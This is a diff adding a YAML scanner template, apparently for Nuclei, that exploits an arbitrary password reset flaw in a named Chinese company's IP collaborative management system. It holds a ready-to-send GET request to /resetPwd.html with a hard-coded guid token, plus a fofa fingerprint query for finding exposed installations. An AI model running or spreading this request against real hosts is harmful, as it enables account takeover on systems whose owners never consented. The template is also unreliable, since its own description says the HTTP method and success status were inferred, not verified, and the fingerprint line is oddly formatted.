@@ -1,0 +1,23 @@
+id: poc-21dacaf2062a6ae1c40e
+info:
+  name: 大为计算机软件开发有限公司知识产权协同创新管理系统任意密码重置
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/21dacaf2062a6ae1c40edd55a9c55916
+
+    [!] 推断说明: 状态码缺失, 推断为 200; 原文未标注HTTP方法, 推断为GET请求。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: other,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 21dacaf2062a6ae1c40edd55a9c55916
+    fofa: + hunter`web.body="大为计算机软件开发有限公司"`
+http:
+- raw:
+  - 'GET /resetPwd.html?guid=IWBI9HveWf01GlDm+je0Ec+qvHyI7F5bjy3kRC2uESwC0+KPmTxUsgHqj+lUuY0F061yruzA+jkZFb9hhNqPhw%3D%3D HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
